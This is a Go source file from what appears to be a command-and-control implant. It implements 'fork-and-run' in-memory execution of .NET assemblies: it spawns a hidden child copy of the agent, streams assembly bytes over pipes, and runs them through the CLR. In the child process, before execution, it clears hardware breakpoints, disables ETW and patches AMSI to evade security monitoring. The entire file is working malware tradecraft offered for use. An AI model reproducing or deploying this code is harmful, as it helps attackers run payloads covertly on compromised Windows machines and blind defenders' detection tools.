//go:build windows

package agent

// fork-and-run for DOTNET_EXEC
//
// Spawns a sacrificial copy of the current executable to host the CLR.
// If the assembly calls Environment.Exit(), only the child dies — the agent
// process is unaffected. The child reads assembly bytes from its stdin pipe
// and writes the captured output to its stdout pipe.
//
// Fallback: if os.Executable() fails (reflective/shellcode injection where
// the current "exe" is a system binary) we fall back to in-process execution.

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const clrChildEnvKey = "__ENDGAME_CLR_CHILD"

// forkRunAssembly is the fork-and-run entry point called by the DOTNET_EXEC handler.
func forkRunAssembly(asmBytes []byte, args string) (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return ExecuteAssembly(asmBytes, args, "", "")
	}

	// ── Pipes ─────────────────────────────────────────────────────────────────
	sa := windows.SecurityAttributes{InheritHandle: 1}
	sa.Length = uint32(unsafe.Sizeof(sa))

	// asmRd → child stdin (inheritable), asmWr → parent writes assembly
	var asmRd, asmWr windows.Handle
	if err := windows.CreatePipe(&asmRd, &asmWr, &sa, 0); err != nil {
		return ExecuteAssembly(asmBytes, args, "", "")
	}
	windows.SetHandleInformation(asmWr, windows.HANDLE_FLAG_INHERIT, 0)

	// outWr → child stdout/stderr (inheritable), outRd → parent reads output
	var outRd, outWr windows.Handle
	if err := windows.CreatePipe(&outRd, &outWr, &sa, 0); err != nil {
		windows.CloseHandle(asmRd)
		windows.CloseHandle(asmWr)
		return ExecuteAssembly(asmBytes, args, "", "")
	}
	windows.SetHandleInformation(outRd, windows.HANDLE_FLAG_INHERIT, 0)

	// ── Environment block ─────────────────────────────────────────────────────
	envBlock := clrBuildEnvBlock(map[string]string{clrChildEnvKey: "1"})

	// ── Spawn child ───────────────────────────────────────────────────────────
	si := windows.StartupInfo{
		Cb:        uint32(unsafe.Sizeof(windows.StartupInfo{})),
		Flags:     windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
		ShowWindow: 0,
		StdInput:  asmRd,
		StdOutput: outWr,
		StdErr:    outWr,
	}
	var pi windows.ProcessInformation

	exePathW, _ := windows.UTF16PtrFromString(exePath)
	err = windows.CreateProcess(
		exePathW, nil, nil, nil,
		true, // bInheritHandles — child gets asmRd and outWr
		windows.CREATE_UNICODE_ENVIRONMENT|windows.CREATE_NO_WINDOW,
		&envBlock[0],
		nil, &si, &pi,
	)

	// Parent no longer needs the child-side pipe ends.
	windows.CloseHandle(asmRd)
	windows.CloseHandle(outWr)

	if err != nil {
		windows.CloseHandle(asmWr)
		windows.CloseHandle(outRd)
		return ExecuteAssembly(asmBytes, args, "", "")
	}

	// ── Send assembly + args to child ─────────────────────────────────────────
	// Protocol: [4 LE bytes: args_len][args][4 LE bytes: asm_len][asm_bytes]
	go func() {
		defer windows.CloseHandle(asmWr)
		hdr := make([]byte, 4)
		binary.LittleEndian.PutUint32(hdr, uint32(len(args)))
		clrWriteHandle(asmWr, hdr)
		clrWriteHandle(asmWr, []byte(args))
		binary.LittleEndian.PutUint32(hdr, uint32(len(asmBytes)))
		clrWriteHandle(asmWr, hdr)
		clrWriteHandle(asmWr, asmBytes)
	}()

	// ── Read output ───────────────────────────────────────────────────────────
	outCh := make(chan string, 1)
	go func() {
		defer windows.CloseHandle(outRd)
		var sb strings.Builder
		buf := make([]byte, 8192)
		for {
			var n uint32
			err := windows.ReadFile(outRd, buf, &n, nil)
			if n > 0 {
				sb.Write(buf[:n])
			}
			if err != nil {
				break
			}
		}
		outCh <- sb.String()
	}()

	var result string
	select {
	case result = <-outCh:
	case <-time.After(60 * time.Second):
		windows.TerminateProcess(pi.Process, 1) //nolint:errcheck
		result = "[!] fork-and-run timeout (60s)\n"
		<-outCh // drain reader goroutine
	}

	windows.WaitForSingleObject(pi.Process, 5000) //nolint:errcheck
	windows.CloseHandle(pi.Process)               //nolint:errcheck
	windows.CloseHandle(pi.Thread)                //nolint:errcheck
	return result, nil
}

// clrChildRun is called in the child process when clrChildEnvKey is set.
// Reads assembly + args from stdin, then executes the CLR writing output
// DIRECTLY to stdout (the pipe back to the parent) via executeInMemory.
//
// Writing directly to the pipe (not a temp file) ensures the parent receives
// all output even when the assembly calls Environment.Exit() before returning.
func clrChildRun() {
	if EvasionPatches != "false" {
		clearHardwareBreakpoints()
		disableETWProcess()
		if AMSIMethod == "veh" {
			patchAMSIVEH()
		} else {
			patchAMSI()
		}
	}

	rd := os.Stdin
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(rd, hdr); err != nil {
		os.Exit(1)
	}
	argsLen := binary.LittleEndian.Uint32(hdr)
	argsBuf := make([]byte, argsLen)
	if _, err := io.ReadFull(rd, argsBuf); err != nil {
		os.Exit(1)
	}
	args := string(argsBuf)

	if _, err := io.ReadFull(rd, hdr); err != nil {
		os.Exit(1)
	}
	asmLen := binary.LittleEndian.Uint32(hdr)
	asmBytes := make([]byte, asmLen)
	if _, err := io.ReadFull(rd, asmBytes); err != nil {
		os.Exit(1)
	}

	// Bootstrap CLR.
	_, pRuntimeInfo, err := bootstrapCLR()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] CLR bootstrap: %v\n", err)
		os.Exit(1)
	}

	// Get the child's stdout handle — this IS the pipe back to the parent.
	// Passing it as wPipe causes executeInMemory to point Console.SetOut at
	// the pipe via ConsoleReset, so all assembly output flows directly to the
	// parent in real-time. If the assembly calls Environment.Exit(), the OS
	// closes the pipe write-end and the parent's ReadFile returns with the
	// bytes already written — nothing is lost in a temp file.
	stdH, _, _ := procGetStdHandle.Call(stdOutputHandle)
	pipeH := windows.Handle(stdH)

	progress := make(chan string, 32)
	go func() {
		for range progress {
		}
	}()

	executeInMemory(pRuntimeInfo, asmBytes, args, progress, pipeH) //nolint:errcheck
	// Output was streamed to pipeH. No fmt.Print needed.
	// If assembly called Environment.Exit() we never reach here — that's fine.
}

// clrBuildEnvBlock builds a double-null-terminated UTF-16 environment block
// from the current process environment plus any extra KEY=VALUE pairs.
func clrBuildEnvBlock(extra map[string]string) []uint16 {
	env := os.Environ()
	for k, v := range extra {
		env = append(env, k+"="+v)
	}
	var block []uint16
	for _, e := range env {
		u, _ := windows.UTF16FromString(e)
		block = append(block, u...)
	}
	block = append(block, 0) // double-null terminator
	return block
}

// clrChildDetect returns true when this process is a CLR fork child.
// Called at the top of Main() before any agent initialisation.
func clrChildDetect() bool {
	if os.Getenv(clrChildEnvKey) == "" {
		return false
	}
	clrChildRun()
	return true
}

// clrWriteHandle writes all of data to h, ignoring partial-write errors.
func clrWriteHandle(h windows.Handle, data []byte) {
	for len(data) > 0 {
		var n uint32
		if err := windows.WriteFile(h, data, &n, nil); err != nil || n == 0 {
			return
		}
		data = data[n:]
	}
}
